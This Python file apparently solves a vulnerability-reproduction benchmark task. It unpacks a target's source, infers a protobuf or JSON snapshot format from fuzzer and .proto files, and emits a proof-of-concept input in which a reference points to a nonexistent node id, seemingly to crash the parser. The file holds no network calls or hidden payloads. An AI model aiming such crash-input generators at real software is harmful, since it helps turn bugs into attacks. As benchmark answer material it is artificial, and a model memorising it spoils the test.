import os
import re
import tarfile
import tempfile
from typing import Dict, List, Optional, Tuple, Any


_SCALAR_TYPES = {
    "double", "float",
    "int32", "int64", "uint32", "uint64",
    "sint32", "sint64",
    "fixed32", "fixed64", "sfixed32", "sfixed64",
    "bool",
    "string", "bytes",
}


def _safe_extract_tar(tar: tarfile.TarFile, path: str) -> None:
    base = os.path.abspath(path)

    def is_within_directory(directory: str, target: str) -> bool:
        abs_directory = os.path.abspath(directory)
        abs_target = os.path.abspath(target)
        try:
            common = os.path.commonpath([abs_directory, abs_target])
        except Exception:
            return False
        return common == abs_directory

    members = []
    for m in tar.getmembers():
        if not m.name or m.name.startswith("/") or m.name.startswith("\\"):
            continue
        dest = os.path.join(base, m.name)
        if not is_within_directory(base, dest):
            continue
        members.append(m)
    tar.extractall(path=base, members=members)


def _read_text_file(path: str, limit: int = 2_000_000) -> str:
    try:
        with open(path, "rb") as f:
            data = f.read(limit)
        return data.decode("utf-8", errors="ignore")
    except Exception:
        return ""


def _iter_source_files(root: str) -> List[str]:
    exts = {".c", ".cc", ".cpp", ".cxx", ".h", ".hpp", ".hh", ".proto", ".inc", ".inl", ".ipp", ".rs", ".go"}
    out = []
    for dirpath, dirnames, filenames in os.walk(root):
        dn = dirpath.lower()
        if any(x in dn for x in ("/.git", "\\.git", "/third_party", "\\third_party", "/vendor", "\\vendor", "/build", "\\build", "/out", "\\out")):
            continue
        for fn in filenames:
            _, ext = os.path.splitext(fn)
            if ext.lower() in exts:
                out.append(os.path.join(dirpath, fn))
    return out


def _varint(n: int) -> bytes:
    n &= (1 << 64) - 1
    out = bytearray()
    while True:
        b = n & 0x7F
        n >>= 7
        if n:
            out.append(b | 0x80)
        else:
            out.append(b)
            break
    return bytes(out)


def _zigzag64(x: int) -> int:
    return (x << 1) ^ (x >> 63)


def _wire_type_for_scalar(t: str) -> int:
    if t in ("string", "bytes"):
        return 2
    if t in ("fixed64", "sfixed64", "double"):
        return 1
    if t in ("fixed32", "sfixed32", "float"):
        return 5
    return 0


def _encode_key(field_no: int, wire: int) -> bytes:
    return _varint((field_no << 3) | wire)


def _encode_scalar(t: str, v: Any) -> bytes:
    if t in ("string",):
        if isinstance(v, bytes):
            b = v
        else:
            b = str(v).encode("utf-8", errors="ignore")
        return _varint(len(b)) + b
    if t in ("bytes",):
        b = v if isinstance(v, (bytes, bytearray)) else bytes(v)
        return _varint(len(b)) + b
    if t in ("fixed64", "sfixed64", "double"):
        import struct
        if t == "double":
            return struct.pack("<d", float(v))
        return struct.pack("<Q", int(v) & ((1 << 64) - 1))
    if t in ("fixed32", "sfixed32", "float"):
        import struct
        if t == "float":
            return struct.pack("<f", float(v))
        return struct.pack("<I", int(v) & ((1 << 32) - 1))
    if t in ("bool",):
        return _varint(1 if v else 0)
    if t in ("sint64",):
        return _varint(_zigzag64(int(v)))
    if t in ("sint32",):
        vv = int(v) & 0xFFFFFFFF
        if vv & 0x80000000:
            vv = -((~vv + 1) & 0xFFFFFFFF)
        return _varint(((vv << 1) ^ (vv >> 31)) & 0xFFFFFFFFFFFFFFFF)
    return _varint(int(v))


class _ProtoField:
    __slots__ = ("name", "num", "label", "type")

    def __init__(self, name: str, num: int, label: str, typ: str):
        self.name = name
        self.num = num
        self.label = label
        self.type = typ


class _ProtoSchema:
    def __init__(self) -> None:
        self.messages: Dict[str, Dict[str, _ProtoField]] = {}
        self.simple_to_full: Dict[str, str] = {}

    def add_message(self, full_name: str) -> None:
        if full_name not in self.messages:
            self.messages[full_name] = {}

    def add_field(self, msg_full: str, field: _ProtoField) -> None:
        self.messages.setdefault(msg_full, {})[field.name] = field

    def finalize(self) -> None:
        simple_map: Dict[str, List[str]] = {}
        for full in self.messages.keys():
            simple = full.split(".")[-1]
            simple_map.setdefault(simple, []).append(full)
        for s, lst in simple_map.items():
            if len(lst) == 1:
                self.simple_to_full[s] = lst[0]

    def resolve_message(self, typ: str) -> Optional[str]:
        t = typ.strip()
        if not t:
            return None
        if t.startswith("."):
            t = t[1:]
        if t in self.messages:
            return t
        simple = t.split(".")[-1]
        return self.simple_to_full.get(simple)


def _parse_proto_files(proto_paths: List[str]) -> _ProtoSchema:
    schema = _ProtoSchema()
    for p in proto_paths:
        txt = _read_text_file(p, limit=5_000_000)
        if not txt:
            continue
        txt = re.sub(r"/\*.*?\*/", "", txt, flags=re.S)
        lines = txt.splitlines()
        stack: List[str] = []
        in_enum_depth = 0
        in_oneof_depth = 0

        for raw in lines:
            line = re.sub(r"//.*", "", raw).strip()
            if not line:
                continue

            if re.match(r"^\s*enum\s+\w+\s*\{", line):
                in_enum_depth += line.count("{") - line.count("}")
                continue
            if in_enum_depth > 0:
                in_enum_depth += line.count("{") - line.count("}")
                continue

            if re.match(r"^\s*oneof\s+\w+\s*\{", line):
                in_oneof_depth += line.count("{") - line.count("}")
                continue
            if in_oneof_depth > 0:
                in_oneof_depth += line.count("{") - line.count("}")
                continue

            m = re.match(r"^\s*message\s+([A-Za-z_]\w*)\s*\{", line)
            if m:
                name = m.group(1)
                full = ".".join(stack + [name]) if stack else name
                stack.append(name)
                schema.add_message(full)
                continue

            if "{" in line:
                pass

            if "}" in line:
                closes = line.count("}")
                for _ in range(closes):
                    if stack:
                        stack.pop()
                continue

            if not stack:
                continue

            fm = re.match(
                r"^\s*(optional|required|repeated)?\s*(map\s*<[^>]+>|[A-Za-z_][\w\.]*)\s+([A-Za-z_]\w*)\s*=\s*(\d+)\s*(?:\[[^\]]*\])?\s*;",
                line,
            )
            if not fm:
                continue
            label = (fm.group(1) or "optional").strip()
            typ = fm.group(2).strip()
            name = fm.group(3).strip()
            num = int(fm.group(4))
            msg_full = ".".join(stack)
            schema.add_field(msg_full, _ProtoField(name=name, num=num, label=label, typ=typ))

    schema.finalize()
    return schema


def _encode_message(schema: _ProtoSchema, msg_full: str, values: Dict[str, Any]) -> bytes:
    fields = schema.messages.get(msg_full)
    if not fields:
        return b""
    out = bytearray()

    for fname, f in fields.items():
        if fname not in values:
            continue
        v = values[fname]
        is_repeated = f.label == "repeated"
        vals = v if (is_repeated and isinstance(v, list)) else ([v] if is_repeated else [v])

        for item in vals:
            typ = f.type.strip()
            if typ.startswith("map<") or typ.startswith("map <"):
                continue
            if typ in _SCALAR_TYPES:
                wire = _wire_type_for_scalar(typ)
                out += _encode_key(f.num, wire)
                out += _encode_scalar(typ, item)
            else:
                msg_t = schema.resolve_message(typ)
                if not msg_t:
                    continue
                if not isinstance(item, dict):
                    continue
                payload = _encode_message(schema, msg_t, item)
                out += _encode_key(f.num, 2)
                out += _varint(len(payload))
                out += payload

    return bytes(out)


def _find_relevant_texts(files: List[str]) -> Tuple[Dict[str, str], List[str], List[str]]:
    texts: Dict[str, str] = {}
    node_map_files: List[str] = []
    fuzzer_files: List[str] = []
    total_bytes = 0
    for p in files:
        if total_bytes > 35_000_000:
            break
        txt = _read_text_file(p)
        if not txt:
            continue
        total_bytes += len(txt)
        lower = txt.lower()
        if "node_id_map" in txt:
            node_map_files.append(p)
        if "llvmfuzzertestoneinput" in lower:
            fuzzer_files.append(p)
        texts[p] = txt
    return texts, node_map_files, fuzzer_files


def _infer_from_code_for_protobuf(texts: Dict[str, str], node_map_files: List[str], fuzzer_files: List[str]) -> Optional[Dict[str, str]]:
    info: Dict[str, str] = {}

    parse_files = fuzzer_files[:] or node_map_files[:]
    root_type = None
    for fp in parse_files:
        t = texts.get(fp, "")
        if not t:
            continue
        for m in re.finditer(r"\b([A-Za-z_]\w*)\s*\.\s*ParseFrom(Array|String)\s*\(", t):
            var = m.group(1)
            pre = t[max(0, m.start() - 4000): m.start()]
            decl = re.search(r"([A-Za-z_][A-Za-z0-9_:]*)\s+" + re.escape(var) + r"\s*;", pre)
            if decl:
                typ = decl.group(1)
                typ = typ.split("::")[-1]
                typ = re.sub(r"[^A-Za-z0-9_]", "", typ)
                if typ:
                    root_type = typ
                    break
        if root_type:
            break
    if not root_type:
        return None
    info["root_type"] = root_type

    nm_text = ""
    for fp in node_map_files or parse_files:
        nm_text = texts.get(fp, "")
        if nm_text:
            break
    if not nm_text:
        return None

    m_id = re.search(r"node_id_map\s*(?:\[\s*|\.\s*(?:emplace|insert)\s*\(\s*)([A-Za-z_]\w*)\s*\.\s*([A-Za-z_]\w*)\s*\(\s*\)", nm_text)
    if m_id:
        node_var = m_id.group(1)
        id_acc = m_id.group(2)
        info["node_var"] = node_var
        info["node_id_accessor"] = id_acc

        pre = nm_text[:m_id.start()]
        fm = None
        for mm in re.finditer(r"for\s*\(\s*[^:]*\b" + re.escape(node_var) + r"\b\s*:\s*([A-Za-z_]\w*)\s*\.\s*([A-Za-z_]\w*)\s*\(\s*\)\s*\)", pre):
            fm = mm
        if fm:
            info["snapshot_var"] = fm.group(1)
            info["nodes_accessor"] = fm.group(2)

    m_ref = re.search(r"node_id_map\s*\.\s*find\s*\(\s*([A-Za-z_]\w*)\s*\.\s*([A-Za-z_]\w*)\s*\(\s*\)\s*\)", nm_text)
    if m_ref:
        ref_var = m_ref.group(1)
        ref_acc = m_ref.group(2)
        info["ref_var"] = ref_var
        info["ref_id_accessor"] = ref_acc

        pre = nm_text[:m_ref.start()]
        fm = None
        for mm in re.finditer(r"for\s*\(\s*[^:]*\b" + re.escape(ref_var) + r"\b\s*:\s*([A-Za-z_]\w*)\s*\.\s*([A-Za-z_]\w*)\s*\(\s*\)\s*\)", pre):
            fm = mm
        if fm:
            info["snapshot_var_refs"] = fm.group(1)
            info["refs_accessor"] = fm.group(2)

    if "nodes_accessor" not in info or "refs_accessor" not in info or "node_id_accessor" not in info or "ref_id_accessor" not in info:
        return None

    return info


def _infer_json_wrapper(text: str) -> Optional[str]:
    keys = set()
    keys.update(re.findall(r'FindMember\s*\(\s*"([^"]+)"\s*\)', text))
    keys.update(re.findall(r'\[\s*"([^"]+)"\s*\]', text))
    wrapper_candidates = ["snapshot", "memory_snapshot", "mem_snapshot", "data", "payload", "root", "graph", "snapshotData", "snapshot_data"]
    if "nodes" in keys and "snapshot" in keys:
        return "snapshot"
    for c in wrapper_candidates:
        if c in keys and "nodes" in keys:
            return c
    if "snapshot" in keys:
        return "snapshot"
    if "memory_snapshot" in keys:
        return "memory_snapshot"
    return None


def _make_json_poc(wrapper: Optional[str]) -> bytes:
    import json
    core = {
        "nodes": [{"id": 1, "node_id": 1}],
        "edges": [{"from": 1, "to": 2, "node_id": 2}],
        "references": [{"from": 1, "to": 2, "node_id": 2}],
    }
    payload = {wrapper: core} if wrapper else core
    return json.dumps(payload, separators=(",", ":"), ensure_ascii=False).encode("utf-8")


class Solution:
    def solve(self, src_path: str) -> bytes:
        root_dir = None
        tmpdir_obj = None
        try:
            if os.path.isdir(src_path):
                root_dir = src_path
            else:
                tmpdir_obj = tempfile.TemporaryDirectory()
                root_dir = tmpdir_obj.name
                with tarfile.open(src_path, "r:*") as tar:
                    _safe_extract_tar(tar, root_dir)

            files = _iter_source_files(root_dir)
            texts, node_map_files, fuzzer_files = _find_relevant_texts(files)

            wants_json = False
            for fp in (node_map_files + fuzzer_files):
                t = texts.get(fp, "")
                tl = t.lower()
                if "rapidjson" in tl or "nlohmann" in tl or "json::parse" in tl or "document.parse" in tl:
                    wants_json = True
                    break

            has_proto = any(p.endswith(".proto") for p in files)
            wants_protobuf = False
            if has_proto:
                for fp in (fuzzer_files or files):
                    t = texts.get(fp)
                    if t is None:
                        t = _read_text_file(fp)
                        texts[fp] = t
                    if ".ParseFromArray" in t or ".ParseFromString" in t:
                        wants_protobuf = True
                        break

            if wants_protobuf:
                info = _infer_from_code_for_protobuf(texts, node_map_files, fuzzer_files)
                if info:
                    proto_paths = [p for p in files if p.endswith(".proto")]
                    schema = _parse_proto_files(proto_paths)

                    root_full = schema.resolve_message(info["root_type"]) or info["root_type"]
                    root_fields = schema.messages.get(root_full)
                    if root_fields:
                        nodes_field = root_fields.get(info["nodes_accessor"])
                        refs_field = root_fields.get(info["refs_accessor"])
                        if nodes_field and refs_field:
                            node_msg_full = schema.resolve_message(nodes_field.type)
                            ref_msg_full = schema.resolve_message(refs_field.type)
                            if node_msg_full and ref_msg_full:
                                node_fields = schema.messages.get(node_msg_full, {})
                                ref_fields = schema.messages.get(ref_msg_full, {})

                                node_vals: Dict[str, Any] = {}
                                if info["node_id_accessor"] in node_fields:
                                    node_vals[info["node_id_accessor"]] = 1
                                else:
                                    for k in node_fields.keys():
                                        if k.endswith("id"):
                                            node_vals[k] = 1
                                            break
                                for k, f in node_fields.items():
                                    if f.label == "required" and k not in node_vals and f.type in _SCALAR_TYPES:
                                        node_vals[k] = 0

                                ref_vals: Dict[str, Any] = {}
                                if info["ref_id_accessor"] in ref_fields:
                                    ref_vals[info["ref_id_accessor"]] = 2
                                else:
                                    for k in ref_fields.keys():
                                        if "target" in k and k.endswith("id"):
                                            ref_vals[k] = 2
                                            break
                                    if not ref_vals:
                                        for k in ref_fields.keys():
                                            if k.endswith("id"):
                                                ref_vals[k] = 2
                                                break
                                for k in ref_fields.keys():
                                    if k in ref_vals:
                                        continue
                                    if k.endswith("id") and ("from" in k or "source" in k or "src" in k or "origin" in k or "parent" in k):
                                        ref_vals[k] = 1
                                for k, f in ref_fields.items():
                                    if f.label == "required" and k not in ref_vals and f.type in _SCALAR_TYPES:
                                        ref_vals[k] = 0

                                root_vals: Dict[str, Any] = {
                                    info["nodes_accessor"]: [node_vals],
                                    info["refs_accessor"]: [ref_vals],
                                }
                                for k, f in root_fields.items():
                                    if f.label == "required" and k not in root_vals and f.type in _SCALAR_TYPES:
                                        root_vals[k] = 0

                                pb = _encode_message(schema, root_full, root_vals)
                                if pb:
                                    return pb

            wrapper = None
            nm_text = texts.get(node_map_files[0], "") if node_map_files else ""
            if nm_text:
                wrapper = _infer_json_wrapper(nm_text)
            if not wrapper and fuzzer_files:
                wrapper = _infer_json_wrapper(texts.get(fuzzer_files[0], ""))

            return _make_json_poc(wrapper)

        finally:
            if tmpdir_obj is not None:
                try:
                    tmpdir_obj.cleanup()
                except Exception:
                    pass